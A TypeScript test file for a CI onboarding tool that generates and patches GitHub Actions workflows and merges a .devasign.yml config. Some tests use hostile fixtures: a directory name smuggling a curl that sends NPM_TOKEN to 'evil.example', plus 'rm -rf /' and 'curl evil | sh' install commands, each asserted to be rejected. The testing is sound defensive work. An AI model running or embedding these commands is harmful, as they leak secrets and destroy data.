// Offline: the onboarding generators against the five sample stacks, the
// extend-existing-workflow edit, .devasign.yml merging, expected secrets, and
// mechanical doctor patches. A generated workflow that fails on its first run
// is the fastest way to lose a user, so every output is parsed back.
//   node --import tsx/esm --test src/verify/onboarding/generate.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { parse } from "yaml";
import type { DevasignVerifyConfig } from "../contract.js";
import { inferSetupFromTree } from "../detect.js";
import {
  ACTION_REF,
  connectionEnv,
  DEVASIGN_YML_HEADER,
  expectedSecrets,
  extendWorkflow,
  generateWorkflow,
  guessVerifyConfig,
  isKnownInstallCommand,
  mergeDevasignYml,
  patchExtendedWorkflowForDoctor,
  patchWorkflowForDoctor,
  prBody,
  stackHints,
  type YmlMergeResult,
} from "./generate.js";

/** The merged text, failing loudly when the merge reported a parse error instead. */
function ymlText(result: YmlMergeResult): string {
  assert.ok("text" in result, `expected merged yml, got ${JSON.stringify(result)}`);
  return result.text;
}

type Stack = { name: string; paths: string[]; packageJson?: object; files?: Record<string, string> };

const STACKS: Stack[] = [
  {
    name: "Next.js + Prisma + Postgres",
    paths: ["package.json", "package-lock.json", "next.config.js", "prisma/schema.prisma", "app/page.tsx", ".env.example", "tests/home.spec.ts", "playwright.config.ts"],
    packageJson: { scripts: { dev: "next dev", build: "next build", start: "next start", test: "vitest run" }, dependencies: { next: "15.0.0", "@prisma/client": "5.0.0", react: "19" }, devDependencies: { vitest: "2.0.0", prisma: "5.0.0", "@playwright/test": "1.55.0" }, engines: { node: ">=20" } },
    files: { ".env.example": "DATABASE_URL=postgres://x\nNEXTAUTH_SECRET=\nSTRIPE_KEY=\nNODE_ENV=development\n" },
  },
  {
    name: "plain Node API with Jest",
    paths: ["package.json", "package-lock.json", "src/server.js", "src/server.test.js", "jest.config.js", ".env.example"],
    packageJson: { scripts: { start: "node src/server.js", test: "jest" }, dependencies: { express: "4" }, devDependencies: { jest: "29" } },
    files: { ".env.example": "PORT=3000\nAPI_KEY=\n" },
  },
  {
    name: "Python FastAPI with pytest",
    paths: ["requirements.txt", "app/main.py", "tests/test_main.py", "pyproject.toml", ".github/workflows/lint.yml"],
    files: { "requirements.txt": "fastapi\nuvicorn\npytest\n", "pyproject.toml": '[project]\nrequires-python = ">=3.11"\n', ".github/workflows/lint.yml": "name: lint\non: [push]\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    env:\n      TOKEN: ${{ secrets.LINT_TOKEN }}\n    steps:\n      - uses: actions/checkout@v4\n" },
  },
  {
    name: "pnpm monorepo",
    paths: ["package.json", "pnpm-lock.yaml", "pnpm-workspace.yaml", "apps/web/package.json", "apps/web/src/app.tsx", "packages/db/package.json", "vitest.config.ts", ".nvmrc"],
    packageJson: { scripts: { test: "vitest run" }, devDependencies: { vitest: "2" }, packageManager: "pnpm@9" },
    files: { ".nvmrc": "22\n" },
  },
  { name: "no tests, no CI", paths: ["index.html", "server.mjs", "src/total.mjs"] },
];

function build(stack: Stack) {
  const files = stack.files || {};
  const pkgText = stack.packageJson ? JSON.stringify(stack.packageJson) : null;
  const setup = inferSetupFromTree(stack.paths, { packageJson: pkgText, envExample: files[".env.example"] ?? null });
  const pkg = stack.packageJson ? (stack.packageJson as any) : null;
  const hints = stackHints(setup, stack.paths, pkg, files);
  const workflows = stack.paths.filter((p) => p.startsWith(".github/workflows/")).map((p) => files[p] || "");
  const secrets = expectedSecrets(setup, workflows);
  const workflow = generateWorkflow(setup, hints, secrets, stack.paths);
  const verify = guessVerifyConfig(setup, hints, pkg, secrets);
  const yml = ymlText(mergeDevasignYml(null, verify));
  return { setup, hints, secrets, workflow, verify, yml, parsed: parse(workflow) as any };
}

test("every sample stack produces a parseable workflow with checkout → setup → verify, OIDC permission, and both triggers", () => {
  for (const stack of STACKS) {
    const b = build(stack);
    const w = b.parsed;
    assert.equal(w.name, "DevAsign verify", stack.name);
    assert.deepEqual(w.on.pull_request.types, ["opened", "synchronize", "reopened"], stack.name);
    assert.deepEqual(w.on.repository_dispatch.types, ["devasign-verify"], stack.name);
    assert.equal(w.permissions["id-token"], "write", stack.name);
    assert.equal(w.permissions.contents, "read", stack.name);
    const steps = w.jobs.verify.steps as Array<{ uses?: string; run?: string; name?: string }>;
    assert.equal(steps[0].uses, "actions/checkout@v4", stack.name);
    assert.match(String((steps[0] as any).with.ref), /pull_request\.head\.sha/, "checks out the PR head, not the merge ref");
    assert.equal(steps[steps.length - 1].uses, ACTION_REF, stack.name);
    assert.ok(steps.some((s) => s.uses?.startsWith("actions/setup-node@")), `${stack.name}: the runner is a Node CLI, so setup-node is always present`);
    assert.ok(parse(b.yml).verify, `${stack.name}: .devasign.yml has a verify block`);
    assert.equal(parse(b.yml).verify.e2e, "auto");
  }
});

test("Next.js + Prisma + Postgres: service container, DATABASE_URL points at it, secrets mapped, prisma prepared, boot config guessed", () => {
  const b = build(STACKS[0]);
  const job = b.parsed.jobs.verify;
  assert.equal(job.services.postgres.image, "postgres:16");
  assert.match(job.services.postgres.options, /pg_isready/);
  assert.equal(job.env.DATABASE_URL, "postgresql://postgres:postgres@localhost:5432/test");
  assert.equal(job.env.NEXTAUTH_SECRET, "${{ secrets.NEXTAUTH_SECRET }}");
  assert.equal(job.env.STRIPE_KEY, "${{ secrets.STRIPE_KEY }}");
  assert.equal(job.env.NODE_ENV, undefined, "wiring vars are not secrets");
  assert.deepEqual(b.secrets, ["NEXTAUTH_SECRET", "STRIPE_KEY"]);
  const steps = job.steps.map((s: any) => s.uses || s.run);
  assert.ok(steps.includes("npm ci"));
  assert.ok(steps.some((s: string) => /prisma migrate deploy/.test(s)));
  assert.equal(job.steps.find((s: any) => s.uses?.startsWith("actions/setup-node")).with["node-version"], "20");
  assert.equal(b.verify.start, "npm run dev");
  assert.equal(b.verify.url, "http://localhost:3000");
  assert.deepEqual(b.verify.services, [{ name: "postgres" }]);
  assert.deepEqual(b.verify.env, ["NEXTAUTH_SECRET", "STRIPE_KEY"]);
  assert.match(b.verify.seed!, /prisma db seed/);
});

test("Node + Jest: no services, secrets from .env.example minus PORT; FastAPI: setup-python + pip, secret from the existing workflow; pnpm monorepo: pnpm setup + frozen lockfile + Node 22; no-CI repo: just node + the action", () => {
  const jest = build(STACKS[1]);
  assert.equal(jest.parsed.jobs.verify.services, undefined);
  assert.deepEqual(jest.secrets, ["API_KEY"]);
  assert.equal(jest.verify.start, "npm start");

  const py = build(STACKS[2]);
  const pySteps = py.parsed.jobs.verify.steps;
  const setupPy = pySteps.find((s: any) => s.uses?.startsWith("actions/setup-python"));
  assert.equal(setupPy.with["python-version"], "3.11");
  assert.ok(pySteps.some((s: any) => s.run === "pip install -r requirements.txt"));
  assert.deepEqual(py.secrets, ["LINT_TOKEN"], "secrets referenced by existing workflows are expected too");
  assert.match(py.verify.start!, /uvicorn/);
  assert.equal(py.verify.url, "http://localhost:8000");

  const mono = build(STACKS[3]);
  const monoSteps = mono.parsed.jobs.verify.steps;
  assert.equal(monoSteps[1].uses, "pnpm/action-setup@v4");
  assert.equal(monoSteps.find((s: any) => s.uses?.startsWith("actions/setup-node")).with["node-version"], "22");
  assert.ok(monoSteps.some((s: any) => s.run === "pnpm install --frozen-lockfile"));

  const none = build(STACKS[4]);
  const steps = none.parsed.jobs.verify.steps;
  assert.deepEqual(steps.map((s: any) => s.uses || s.run), ["actions/checkout@v4", "actions/setup-node@v4", ACTION_REF]);
  assert.equal(none.verify.start, undefined, "no boot command is invented");
  assert.equal(none.secrets.length, 0);
  assert.deepEqual(connectionEnv(none.setup), {});
});

test("extendWorkflow appends the step to the test job, grants id-token, leaves a multi-job file's triggers alone, and keeps comments", () => {
  const existing = [
    "# my CI",
    "name: CI",
    "on:",
    "  pull_request:",
    "jobs:",
    "  lint:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - run: npm run lint",
    "  test:",
    "    runs-on: ubuntu-latest",
    "    permissions:",
    "      contents: read",
    "    services:",
    "      postgres: { image: postgres:16 }",
    "    steps:",
    "      - uses: actions/checkout@v4 # keep me",
    "      - run: npm test",
    "",
  ].join("\n");
  const out = extendWorkflow(existing);
  assert.ok("text" in out, JSON.stringify(out));
  if ("text" in out) {
    assert.equal(out.job, "test");
    assert.match(out.text, /# my CI/);
    assert.match(out.text, /# keep me/);
    const w = parse(out.text);
    const steps = w.jobs.test.steps;
    assert.deepEqual(steps[steps.length - 1], { name: "DevAsign verify", uses: ACTION_REF });
    assert.equal(w.jobs.lint.steps.length, 1, "other jobs untouched");
    assert.equal(w.jobs.test.permissions["id-token"], "write");
    assert.equal(w.jobs.test.permissions.contents, "read");
    // A repository_dispatch runs EVERY job in the file, so this one — which also lints —
    // never gets the trigger: a re-run request would have run whatever else lives here.
    assert.equal(out.dispatch, false);
    assert.equal(w.on.repository_dispatch, undefined);
    assert.deepEqual(w.jobs.test.steps[0], { uses: "actions/checkout@v4" }, "and their checkout is left exactly as it was");
    assert.equal(w.jobs.test.services.postgres.image, "postgres:16", "their services are reused");
    const again = extendWorkflow(out.text);
    assert.ok("error" in again && /already/.test(again.error));
  }
  assert.ok("error" in extendWorkflow("name: x\n"));
  const picked = extendWorkflow("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps: []\n  deploy:\n    runs-on: ubuntu-latest\n    steps: []\n", { job: "deploy" });
  assert.ok("text" in picked && picked.job === "deploy");
  assert.ok("text" in picked && picked.dispatch === false, "a file with a deploy job beside the tested one is not ours to re-trigger");
});

test("a single-job workflow does take the dispatch trigger, and its checkout learns the dispatched sha", () => {
  const only = ["name: CI", "on:", "  pull_request:", "jobs:", "  test:", "    runs-on: ubuntu-latest", "    steps:", "      - uses: actions/checkout@v4", "      - run: npm test", ""].join("\n");
  const out = extendWorkflow(only);
  assert.ok("text" in out, JSON.stringify(out));
  if (!("text" in out)) return;
  assert.equal(out.dispatch, true);
  const w = parse(out.text);
  assert.deepEqual(w.on.repository_dispatch.types, ["devasign-verify"]);
  // Without a ref the dispatched run checks out the default branch and verifies the
  // wrong commit; github.sha keeps every other event checking out exactly what it did.
  assert.equal(w.jobs.test.steps[0].with.ref, "${{ github.event.client_payload.sha || github.sha }}");
  assert.equal(w.on.pull_request, null, "their own triggers are untouched");

  const theirRef = extendWorkflow(only.replace("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v4\n        with:\n          ref: main\n          fetch-depth: 0"));
  assert.ok("text" in theirRef);
  if ("text" in theirRef) {
    const w2 = parse(theirRef.text);
    assert.equal(w2.jobs.test.steps[0].with.ref, "main", "a ref they chose is theirs");
    assert.equal(w2.jobs.test.steps[0].with["fetch-depth"], 0);
  }
});

// The nested-app boot config Phase 3 infers, plus the two keys inference must never write.
const INFERRED: DevasignVerifyConfig = {
  e2e: "auto",
  start: "npm --prefix frontend run dev -- --port 3001 --strictPort",
  url: "http://localhost:3001",
  ready: "/",
  servers: [{ name: "backend", start: "npm --prefix backend run dev:ephemeral", url: "http://localhost:8787", ready: "/" }],
  login: { script: "node ./scripts/devasign-login.mjs" },
  env: ["SESSION_SECRET"],
  services: [{ name: "postgres" }],
};

test("mergeDevasignYml adds the verify block to a file that lacks one, keeping comments and other top-level keys", () => {
  const existing = "# repo config\nversion: 2\nfamily:\n  name: acme # keep\n  sisters:\n    - acme/other\n";
  const merged = ymlText(mergeDevasignYml(existing, { e2e: "auto", start: "npm run dev", url: "http://localhost:3000" }));
  assert.match(merged, /# repo config/);
  assert.match(merged, /name: acme # keep/);
  const doc = parse(merged);
  assert.equal(doc.version, 2);
  assert.deepEqual(doc.family.sisters, ["acme/other"]);
  assert.equal(doc.verify.start, "npm run dev");
  const fresh = ymlText(mergeDevasignYml(null, { e2e: "auto" }));
  assert.match(fresh, /^# \.devasign\.yml/);
});

test("mergeDevasignYml adds the boot keys an existing verify block lacks and never overwrites one the maintainer set", () => {
  const existing = [
    "# ours",
    "verify:",
    "  e2e: always",
    "  url: http://localhost:4000 # theirs",
    "  login:",
    "    strategy: none",
    "family:",
    "  name: acme",
    "",
  ].join("\n");
  const merged = ymlText(mergeDevasignYml(existing, INFERRED));
  const v = parse(merged).verify;
  assert.equal(v.e2e, "always", "their policy stands");
  assert.equal(v.url, "http://localhost:4000", "their url stands");
  // start/url/servers/login describe ONE boot. Our vite start beside their :4000 points
  // the browser at a port nothing serves — under e2e: always, at every UI criterion.
  assert.equal(v.start, undefined, "half their boot and half ours is not a boot");
  assert.equal(v.ready, undefined);
  assert.equal(v.servers, undefined);
  assert.equal(v.login.strategy, "none", "and their login block is not rewritten either");
  assert.equal(v.env, undefined, "inference never writes env");
  assert.equal(v.services, undefined, "inference never writes services");
  assert.match(merged, /# ours/);
  assert.match(merged, /# theirs/);
  assert.equal(parse(merged).family.name, "acme");

  // A repo already booting fine on the single-process path: adding servers/login would
  // switch it onto managed boot and start a service it never asked for.
  const theirs = "verify:\n  e2e: auto\n  start: docker compose up -d && npm run dev\n  url: http://localhost:8080\n  ready: /\n";
  const untouched = parse(ymlText(mergeDevasignYml(theirs, INFERRED))).verify;
  assert.equal(untouched.start, "docker compose up -d && npm run dev");
  assert.equal(untouched.servers, undefined);
  assert.equal(untouched.login, undefined);

  const theirLogin = "verify:\n  e2e: auto\n  login:\n    script: node ./scripts/mine.mjs\n    check: /api/me\n";
  const keptYml = ymlText(mergeDevasignYml(theirLogin, INFERRED));
  const kept = parse(keptYml).verify.login;
  assert.deepEqual(kept, { script: "node ./scripts/mine.mjs", check: "/api/me" }, "a login script of their own is left alone");
  assert.equal(parse(keptYml).verify.start, undefined, "and a login script of their own says the boot is theirs");

  // devasignhq/agent: e2e and login stay where they are, the boot keys are appended.
  const dogfood = ymlText(mergeDevasignYml("verify:\n  e2e: auto\n  login:\n    strategy: none\n", INFERRED));
  assert.equal(
    dogfood,
    [
      "verify:",
      "  e2e: auto",
      "  login:",
      "    script: node ./scripts/devasign-login.mjs",
      "  start: npm --prefix frontend run dev -- --port 3001 --strictPort",
      "  url: http://localhost:3001",
      "  ready: /",
      "  servers:",
      "    - name: backend",
      "      start: npm --prefix backend run dev:ephemeral",
      "      url: http://localhost:8787",
      "      ready: /",
      "",
    ].join("\n")
  );
});

test("mergeDevasignYml is a no-op when nothing is missing, adds nothing under e2e: never, and refuses to rewrite a file it could not parse", () => {
  const already = "verify:\n  e2e: auto\n  start: npm run dev\n  url: http://localhost:3000\n  ready: /\n  login:\n    script: node ./scripts/devasign-login.mjs\n";
  assert.deepEqual(mergeDevasignYml(already, { e2e: "auto", start: "other", url: "http://localhost:9999", ready: "/x" }), { text: already }, "the original string comes back byte for byte");

  const never = "verify:\n  e2e: never\n";
  assert.deepEqual(mergeDevasignYml(never, INFERRED), { text: never });
  assert.equal(parse(ymlText(mergeDevasignYml(null, { ...INFERRED, e2e: "never" }))).verify.start, undefined, "a fresh file under never gets no boot keys");

  for (const broken of ["verify:\n  e2e: auto\n  - nope\n", "verify:\n  e2e: auto\nfamily: [1,\n"]) {
    const out = mergeDevasignYml(broken, INFERRED);
    assert.ok("error" in out && !("text" in out), broken);
    assert.match((out as { error: string }).error, /did not parse/);
  }
  assert.ok("error" in mergeDevasignYml("verify: 3\n", INFERRED), "a verify key that is not a map is the maintainer's to fix");
  assert.ok("error" in mergeDevasignYml("- one\n- two\n", INFERRED), "a document that is not a map is never replaced");
});

test("mergeDevasignYml answers overwrite their own keys only, in an existing block and in a new file", () => {
  const existing = "verify:\n  e2e: auto\n  start: npm run dev\n  url: http://localhost:3000\n";
  const merged = ymlText(mergeDevasignYml(existing, INFERRED, { url: "http://localhost:5173", login: { script: "node ./scripts/answer.mjs", check: "/api/me" } }));
  const v = parse(merged).verify;
  assert.equal(v.url, "http://localhost:5173", "the answer wins over the maintainer's url");
  assert.equal(v.start, "npm run dev", "an unanswered key they set is still untouched");
  assert.deepEqual(v.login, { script: "node ./scripts/answer.mjs", check: "/api/me" });
  assert.equal(v.servers, undefined, "their start owns the boot: inference adds no server beside it");

  const fresh = parse(ymlText(mergeDevasignYml(null, INFERRED, { e2e: "always" }))).verify;
  assert.equal(fresh.e2e, "always");
  assert.equal(fresh.start, INFERRED.start);
});

test("the yml header and the PR body's Browser tests section describe what happens with and without boot config, and promise no boot until Phase 4 proves one", () => {
  assert.match(DEVASIGN_YML_HEADER, /checked below browser level with a note on each PR/);
  assert.match(DEVASIGN_YML_HEADER, /always \(no browser = unverifiable\)/);
  assert.doesNotMatch(DEVASIGN_YML_HEADER, /reported as unverifiable \(never as failed\)/);
  assert.ok(DEVASIGN_YML_HEADER.split("\n").every((l) => !l || l.startsWith("# ")), "every header line stays a YAML comment");
  assert.deepEqual(parse(ymlText(mergeDevasignYml(null, { e2e: "auto" }))), { verify: { e2e: "auto" } });

  const none = build(STACKS[4]);
  const browser = (body: string) => body.split("### Browser tests\n")[1].split("\n\n")[0];
  const unconfigured = browser(prBody({ mode: "separate", workflowPath: "x", hints: none.hints, setup: none.setup, verify: none.verify, expected: [], missing: [] }));
  assert.match(unconfigured, /Set `verify\.start`.*and `verify\.url`/);
  assert.match(unconfigured, /checked below browser level and each PR carries a note saying so/);
  assert.match(unconfigured, /With `e2e: always` they are reported as \*\*unverifiable\*\* instead/);
  assert.match(unconfigured, /UI criteria on PRs show a note until browser tests run\./);

  const next = build(STACKS[0]);
  const configured = browser(prBody({ mode: "separate", workflowPath: "x", hints: next.hints, setup: next.setup, verify: next.verify, expected: [], missing: [] }));
  assert.match(configured, /start the app with `npm run dev` and wait for `http:\/\/localhost:3000\/`/);
  assert.match(configured, /No login script, so browser tests run signed out/);
  assert.match(configured, /UI criteria on PRs show a note until browser tests run\./);
  assert.doesNotMatch(configured, /below browser level/, "a repo with boot config gets no fallback caveat");
  assert.doesNotMatch(configured, /came up|booted|verified/i, "nothing claims the app actually starts until the probe says so");

  const nested = browser(prBody({ mode: "separate", workflowPath: "x", hints: next.hints, setup: next.setup, verify: INFERRED, expected: [], missing: [] }));
  assert.match(nested, /start the app with `npm --prefix frontend run dev -- --port 3001 --strictPort` and wait for `http:\/\/localhost:3001\/`/);
  assert.match(nested, /- `backend` starts first: `npm --prefix backend run dev:ephemeral`, ready at `http:\/\/localhost:8787\/`/);
  assert.match(nested, /- Signed in by `node \.\/scripts\/devasign-login\.mjs`/);

  const off = browser(prBody({ mode: "separate", workflowPath: "x", hints: next.hints, setup: next.setup, verify: { e2e: "never" }, expected: [], missing: [] }));
  assert.match(off, /`e2e: never` is set, so DevAsign plans no browser tests/);
  assert.doesNotMatch(off, /show a note/, "never means no note to explain");
});

test("guessVerifyConfig prefers the inferred nested boot config over its root-only guess", () => {
  const b = build(STACKS[0]);
  const pkg = STACKS[0].packageJson as any;
  const root = guessVerifyConfig(b.setup, b.hints, pkg, b.secrets);
  assert.equal(root.start, "npm run dev", "without inference the root guess stands");
  assert.equal(root.build, "npm run build");

  const boot = guessVerifyConfig(b.setup, b.hints, pkg, b.secrets, { start: INFERRED.start, url: INFERRED.url, ready: "/", servers: INFERRED.servers, login: INFERRED.login });
  assert.equal(boot.start, INFERRED.start);
  assert.equal(boot.url, "http://localhost:3001");
  assert.equal(boot.build, undefined, "the root-only next build does not survive a nested start");
  assert.deepEqual(boot.login, { script: "node ./scripts/devasign-login.mjs" }, "the login script replaces strategy: none");
  assert.deepEqual(boot.servers, INFERRED.servers);
  assert.deepEqual(boot.services, [{ name: "postgres" }], "services and secrets still come from the detected setup");
  assert.deepEqual(boot.env, ["NEXTAUTH_SECRET", "STRIPE_KEY"]);
  assert.match(boot.seed!, /prisma db seed/);
});

test("prBody lists expected secrets and flags the missing ones; patchWorkflowForDoctor fixes runtime + browsers only", () => {
  const b = build(STACKS[0]);
  const body = prBody({ mode: "separate", workflowPath: ".github/workflows/devasign-verify.yml", hints: b.hints, setup: b.setup, verify: b.verify, expected: b.secrets, missing: ["STRIPE_KEY"] });
  assert.match(body, /`NEXTAUTH_SECRET` — present/);
  assert.match(body, /`STRIPE_KEY` — \*\*not found/);
  assert.match(body, /Add the missing secret under Settings/);
  assert.match(body, /detected: Next\.js, Prisma, Postgres/);
  const unreadable = prBody({ mode: "separate", workflowPath: "x", hints: b.hints, setup: b.setup, verify: b.verify, expected: b.secrets, missing: null });
  assert.match(unreadable, /could not read this repository's secret names/);
  const ext = prBody({ mode: "extend", workflowPath: ".github/workflows/ci.yml", hints: b.hints, setup: b.setup, verify: b.verify, expected: [], missing: [], extendedJob: "test" });
  assert.match(ext, /appended to the `test` job in `\.github\/workflows\/ci\.yml`/);

  const patched = patchWorkflowForDoctor(b.workflow, { stage: "install", code: "wrong_runtime_version", message: "the repository wants Node >=22 but the runner has v20.1.0" });
  assert.ok(patched);
  assert.equal(parse(patched!).jobs.verify.steps.find((s: any) => s.uses?.startsWith("actions/setup-node")).with["node-version"], "22");
  const browsers = patchWorkflowForDoctor(b.workflow, { stage: "browsers", code: "browser_install_failed", message: "no chromium" });
  assert.ok(browsers);
  const steps = parse(browsers!).jobs.verify.steps;
  assert.equal(steps[steps.length - 2].run, "npx playwright install --with-deps chromium");
  assert.equal(steps[steps.length - 1].uses, ACTION_REF);
  assert.equal(patchWorkflowForDoctor(b.workflow, { stage: "start", code: "no_start_command", message: "x" }), null, "needs a human");
});

test("no root manifest: one install step per top-level package, cache keyed on their lockfiles", () => {
  const paths = ["backend/package.json", "backend/package-lock.json", "backend/src/a.ts", "frontend/package.json", "frontend/package-lock.json", "frontend/src/app.tsx"];
  const setup = inferSetupFromTree(paths);
  const w = parse(generateWorkflow(setup, stackHints(setup, paths, null, {}), [], paths)) as any;
  const steps = w.jobs.verify.steps as Array<{ uses?: string; run?: string; with?: Record<string, string> }>;
  assert.deepEqual(steps.map((s) => s.uses || s.run), ["actions/checkout@v4", "actions/setup-node@v4", "npm ci --prefix backend", "npm ci --prefix frontend", ACTION_REF]);
  const node = steps.find((s) => s.uses?.startsWith("actions/setup-node"))!;
  assert.equal(node.with!.cache, "npm");
  assert.equal(node.with!["cache-dependency-path"], "backend/package-lock.json\nfrontend/package-lock.json");
});

test("a package directory a shell would read as a command never reaches a run: step", () => {
  // Git allows any byte but "/" in a path component, and `run:` is executed with bash -e.
  // The default branch is where this tree comes from, so an ordinary PR can rename into it.
  const evil = "web;curl$IFS-d@-$IFS'evil.example'<<<$NPM_TOKEN;#";
  const paths = [`${evil}/package.json`, `${evil}/package-lock.json`, "frontend/package.json", "frontend/package-lock.json"];
  const setup = inferSetupFromTree(paths, { envExample: "NPM_TOKEN=\n" });
  const text = generateWorkflow(setup, stackHints(setup, paths, null, {}), ["NPM_TOKEN"], paths);
  assert.ok(!text.includes("evil.example"), text);
  const w = parse(text) as any;
  assert.deepEqual(
    (w.jobs.verify.steps as any[]).map((s) => s.uses || s.run),
    ["actions/checkout@v4", "actions/setup-node@v4", "npm ci --prefix frontend", ACTION_REF],
    "the package that cannot be named safely is left uninstalled, not interpolated"
  );
  assert.equal(w.jobs.verify.steps[1].with["cache-dependency-path"], "frontend/package-lock.json", "and its lockfile is not a cache key either");
  assert.equal(w.jobs.verify.env.NPM_TOKEN, "${{ secrets.NPM_TOKEN }}", "the secrets that payload was reaching for are still wired in");
});

test("patchWorkflowForDoctor: missing_dependencies inserts the named install steps once, before the verify step", () => {
  const base = build(STACKS[4]).workflow;
  const doctor = { stage: "install" as const, code: "missing_dependencies" as const, message: "m", packages: [{ dir: "backend", install: "npm ci --prefix backend" }, { dir: "frontend", install: "npm ci --prefix frontend" }] };
  const patched = patchWorkflowForDoctor(base, doctor)!;
  const steps = (parse(patched) as any).jobs.verify.steps.map((s: any) => s.uses || s.run);
  assert.deepEqual(steps, ["actions/checkout@v4", "actions/setup-node@v4", "npm ci --prefix backend", "npm ci --prefix frontend", ACTION_REF]);
  assert.equal(patchWorkflowForDoctor(patched, doctor), null, "already installed: nothing to add");
  assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [] }), null);
  assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [{ dir: "../evil", install: "rm -rf /" }] }), null, "a directory that is not a plain name never reaches the workflow");
  // The command is the part that runs: only installCommandFor's own shapes, for that very directory.
  for (const install of ["npm ci --prefix backend && curl evil | sh", "npm ci --prefix frontend", "cd backend && npm ci", "npm ci"]) {
    assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [{ dir: "backend", install }] }), null, install);
  }
  assert.ok(isKnownInstallCommand("pnpm install --frozen-lockfile --dir web", "web"));
  assert.ok(isKnownInstallCommand("npm install --prefix api.v2", "api.v2"));
  assert.ok(!isKnownInstallCommand("npm install --prefix apiXv2", "api.v2"), "the dot is a dot");
  // The same gate startCommandFor applies: these are arguments, not directories, and the
  // guarantee belongs in the validator rather than in whichever caller remembers it.
  assert.ok(!isKnownInstallCommand("npm install --prefix ..", ".."));
  assert.ok(!isKnownInstallCommand("npm install --prefix .", "."));
  assert.ok(!isKnownInstallCommand("npm install --prefix -rf", "-rf"));
  assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [{ dir: "..", install: "npm install --prefix .." }] }), null);

  // A dir ending in a non-word character used to defeat the "already installed" guard,
  // so every doctor follow-up appended the same step again.
  const dotted = { ...doctor, packages: [{ dir: "api.", install: "npm install --prefix api." }] };
  const once = patchWorkflowForDoctor(base, dotted)!;
  assert.ok(once.includes("npm install --prefix api."));
  assert.equal(patchWorkflowForDoctor(once, dotted), null, "the step is already there");
});

test("patchExtendedWorkflowForDoctor edits only the job that runs DevAsign verify in a customer's own workflow", () => {
  const ci = [
    "name: CI",
    "on: [pull_request]",
    "jobs:",
    "  lint:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "    - uses: actions/setup-node@v4",
    "      with:",
    "        node-version: 18",
    "    - run: npm ci --prefix backend",
    "  test:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "    - uses: actions/checkout@v4",
    "    - uses: actions/setup-node@v4",
    "      with:",
    "        node-version: \"20\"",
    "    # keep this comment",
    "    - name: DevAsign verify",
    `      uses: ${ACTION_REF}`,
    "",
  ].join("\n");
  const runtime = patchExtendedWorkflowForDoctor(ci, { stage: "install", code: "wrong_runtime_version", message: "the repository wants Node >=22 but the runner has v20.1.0" });
  const r = parse(runtime!);
  assert.equal(r.jobs.test.steps[1].with["node-version"], "22");
  assert.equal(r.jobs.lint.steps[0].with["node-version"], 18, "the lint job's Node is untouched");
  assert.match(runtime!, /# keep this comment/);

  const deps = patchExtendedWorkflowForDoctor(ci, { stage: "install", code: "missing_dependencies", message: "m", packages: [{ dir: "backend", install: "npm ci --prefix backend" }] });
  const steps = parse(deps!).jobs.test.steps;
  assert.deepEqual(steps.map((x: any) => x.uses || x.run), ["actions/checkout@v4", "actions/setup-node@v4", "npm ci --prefix backend", ACTION_REF], "another job installing backend does not count");
  assert.deepEqual(parse(deps!).jobs.lint, parse(ci).jobs.lint);

  const browsers = parse(patchExtendedWorkflowForDoctor(ci, { stage: "browsers", code: "browser_install_failed", message: "no chromium" })!).jobs.test.steps;
  assert.equal(browsers[browsers.length - 2].run, "npx playwright install --with-deps chromium");

  const matrix = ci.replace('node-version: "20"', "node-version: ${{ matrix.node }}");
  assert.equal(patchExtendedWorkflowForDoctor(matrix, { stage: "install", code: "wrong_runtime_version", message: "wants Node 22 but has 20" }), null, "a matrix is the customer's to change");
  assert.equal(patchExtendedWorkflowForDoctor(ci.replace(`uses: ${ACTION_REF}`, "run: echo"), { stage: "browsers", code: "browser_install_failed", message: "x" }), null, "no job runs DevAsign verify");
  assert.equal(patchExtendedWorkflowForDoctor(ci, { stage: "start", code: "no_start_command", message: "x" }), null, "needs a human");
  assert.equal(patchExtendedWorkflowForDoctor("jobs: [", { stage: "browsers", code: "browser_install_failed", message: "x" }), null);
});
